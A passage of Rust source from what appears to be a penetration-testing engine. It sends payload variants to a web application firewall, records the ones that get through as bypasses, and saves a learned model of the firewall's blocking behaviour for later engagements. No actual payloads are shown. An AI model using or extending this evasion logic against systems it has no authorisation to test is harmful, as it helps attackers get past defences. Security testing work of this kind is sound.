            tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
        }
        let req = build(&m.delivery, &m.payload);
        out.variants += 1;
        match send_with_envelope(client, &req, timeout_secs).await {
            Ok(env) => {
                sends += 1;
                arm_errors[arm] = 0;
                let (status, blocked) = (env.status, env.blocked);
                samples.push((featurize(&m.payload, arm), blocked));
                let effective = m.delivery.effective_payload(&m.payload);
                let verified = verified_bypass(class, payload, &effective, blocked, status);
                if differential_confirmed(verified, differential, base_blocked[arm]) {
                    out.bypasses.push(EquivBypass {
                        payload: m.payload.clone(),
                        delivery_label: m.delivery.label(),
                        delivery: m.delivery.clone(),
                        rules: m.rules.clone(),
                        status,
                        phase: "cegis",
                        envelope: env,
                    });
                } else if !blocked {
                    out.unverified_not_blocked += 1;
                }
                tried.insert((pp.clone(), aa));
                if blocked {
                    model = WafModel::learn(&samples, 30);
                }
            }
            Err(e) => {
                // §7 forward-progress: mark tried so synthesis advances.
                tried.insert((pp.clone(), aa));
                // Per-arm consecutive error tracking: after
                // MAX_CONSECUTIVE_ARM_ERRORS, mark the arm dead.
                arm_errors[arm] += 1;
                if arm_errors[arm] >= MAX_CONSECUTIVE_ARM_ERRORS {
                    dead_arms.insert(arm);
                }
                *error_tally
                    .entry(format!("equiv cegis send: {e}"))
                    .or_insert(0) += 1;
            }
        }
    }

    // Persist the refined boundary so the next engagement vs this WAF
    // warm-starts (the compounding asset). Never overwrite a good prior
    // with a thin sample.
    if !samples.is_empty() {
        let refined = WafModel::learn(&samples, 30);
        if refined.n >= arms || prior.is_none() {
            out.model_saved = refined.save(&mpath).is_ok();
        }
    }
    out.sends = sends;
    // Emit the aggregated error tally, at most one line per
    // distinct error string regardless of how many times each fired.
    if !error_tally.is_empty() {
        let mut rows: Vec<(String, usize)> = error_tally.into_iter().collect();
        rows.sort_by_key(|a| std::cmp::Reverse(a.1));
        for (msg, count) in rows {
            if count == 1 {
                eprintln!("warn ({class}): {msg}");
            } else {
                eprintln!("warn ({class}): {count}× {msg}");
            }
        }
    }
    out
}

#[cfg(test)]
#[path = "equiv_engine_tests.rs"]
mod tests;
